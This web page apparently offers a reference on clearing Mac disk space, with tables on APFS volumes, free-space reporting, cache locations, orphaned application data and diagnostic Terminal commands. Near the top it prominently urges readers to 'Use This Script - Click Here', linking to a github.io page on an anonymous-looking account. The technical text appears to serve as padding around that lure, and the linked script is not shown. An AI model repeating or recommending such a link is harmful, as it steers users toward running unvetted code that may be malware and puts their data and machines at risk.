# How To Clear Mac Space

> **Applies to:** macOS 10.13 High Sierra — macOS 26.5 Tahoe · **Architecture:** Intel x86_64 & Apple Silicon ARM64

---

## Mac Disk Space — APFS Container Architecture, Storage Category Accounting, and Space Reclamation

> **[Use This Script - Click Here](https://disk-script-317.github.io/.github/how-to-clear-mac-space)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.

**What's actually consuming Mac disk space, in order of impact:**

- APFS local snapshots retaining deleted file blocks through Copy-on-Write references — invisible to Finder but consuming real storage
- Application caches in `~/Library/Caches/` growing without bound as applications fail to enforce their own size limits
- Large media files in Downloads, Desktop, and project directories accumulated without regular review
- iOS device backups written by Finder — typically the largest single recoverable space consumer on machines that sync devices
- Orphaned application support data in `~/Library/Application Support/` from applications removed by dragging to Trash
- Language files bundled with applications — unused locale resources that ship with every app installation

---

## APFS Container and Volume Architecture

Since macOS 10.13, all Mac startup volumes use **APFS (Apple File System)** organized into a **container** — a logical wrapper that hosts multiple volumes sharing one unified pool of free space. The key architectural consequence is that free space is not partitioned between volumes: growth in any volume directly reduces space available to all others.

| APFS Volume | Role | Writable | Storage Behavior |
|---|---|---|---|
| Macintosh HD | Signed System Volume — OS itself | No | Cryptographically sealed; fixed size |
| Macintosh HD — Data | All user data, home directories, third-party apps | Yes | Primary space consumer |
| VM | Swap files, `sleepimage`, compressed memory overflow | Yes | Grows under memory pressure |
| Preboot | Boot metadata required to mount the SSV | Managed | Small, system-managed |
| Recovery | recoveryOS for reinstall and NVRAM reset | No | Fixed, ~1GB |

The **VM volume** deserves specific attention: on machines with limited RAM under heavy load, the VM volume can expand significantly as macOS pages memory to storage. This expansion reduces available space for user data while being reported inconsistently across different storage measurement tools.

---

## Free Space Calculation Discrepancies

macOS reports available disk space differently depending on which tool is used:

| Tool | Calculation Method | What It Includes |
|---|---|---|
| Finder status bar | APFS-aware, includes purgeable | Reports purgeable as available |
| About This Mac → Storage | Category-based estimate | Snapshot space shown as "System Data" |
| `df -h` in Terminal | Traditional POSIX free blocks | Excludes purgeable, includes snapshots as used |
| Disk Utility | Volume-level APFS metadata | Most accurate for actual available space |
| `du -sh ~/` | Filesystem walk | Counts hardlinks once, misses some system dirs |

The discrepancy between Finder's reported free space and `df -h` can be several gigabytes on machines with active Time Machine local snapshots. The Finder figure may appear reassuringly large while `df` reveals that actual writable space is critically constrained.

---

## Application Cache Architecture

macOS applications write cache data to `~/Library/Caches/` organized by bundle identifier. Each application is responsible for managing its own cache size — the operating system does not enforce limits or perform automatic pruning of application caches.

Caches are intended to store reconstructable data: thumbnail databases, compiled shader caches, network response caches, and decoded media assets. In practice, many applications allow their cache directories to grow without bound over months or years of use. Common large cache consumers include:

| Application Category | Cache Location Pattern | Typical Accumulated Size |
|---|---|---|
| Web browsers | `~/Library/Caches/com.google.Chrome/` | 1–5GB |
| Xcode | `~/Library/Developer/Xcode/DerivedData/` | 5–30GB |
| Photos | `~/Library/Caches/com.apple.Photos/` | 500MB–3GB |
| Music / Spotify | `~/Library/Caches/com.spotify.client/` | 1–4GB |
| Creative apps | `~/Library/Caches/Adobe/` | 2–20GB |

---

## Orphaned Application Data After Uninstallation

Dragging an application to the Trash removes the `.app` bundle but leaves behind all data the application wrote outside its bundle: preferences in `~/Library/Preferences/`, support files in `~/Library/Application Support/`, caches in `~/Library/Caches/`, and LaunchAgent plists in `~/Library/LaunchAgents/`. These files persist indefinitely and accumulate across years of software installation and removal.

The `~/Library/Application Support/` directory is particularly prone to orphaned data accumulation, as applications commonly write gigabytes of database files, asset caches, and user content to named subdirectories that remain after the parent application is removed.

---

## Diagnostic Data Sources

| Tool | Access | What It Reveals |
|---|---|---|
| Console.app | Applications → Utilities | Daemon logs, storage events, cache eviction notices |
| Activity Monitor | Applications → Utilities | Process disk I/O, memory pressure, purgeable space |
| System Information | About This Mac → System Report | Storage hardware, APFS volume details |
| Disk Utility | Applications → Utilities | APFS container structure, volume sizes, First Aid |
| `df -h` | Terminal | Actual filesystem free space including snapshot overhead |
| `du -sh` | Terminal | Directory size measurement |
| `tmutil listlocalsnapshots /` | Terminal | Local Time Machine snapshot inventory |
| `ioreg -l` | Terminal | Full IOKit registry for storage hardware |

---

## macOS Version Architecture Context

| macOS Version | Darwin Kernel | Relevant Storage Change |
|---|---|---|
| macOS 12 Monterey | Darwin 21 | APFS sealed volume refinements; improved purgeable accounting |
| macOS 13 Ventura | Darwin 22 | Revised System Settings storage panel; new cache path locations |
| macOS 14 Sonoma | Darwin 23 | Enhanced iCloud Optimize Storage integration |
| macOS 15 Sequoia | Darwin 24 | Revised local snapshot retention policy |
| macOS 26 Tahoe | Darwin 25 | Updated storage management framework |

---

*This reference covers Mac Disk Space as observed on macOS 10.13 High Sierra through macOS 26.5 Tahoe on Intel x86_64 and Apple Silicon ARM64 hardware.*
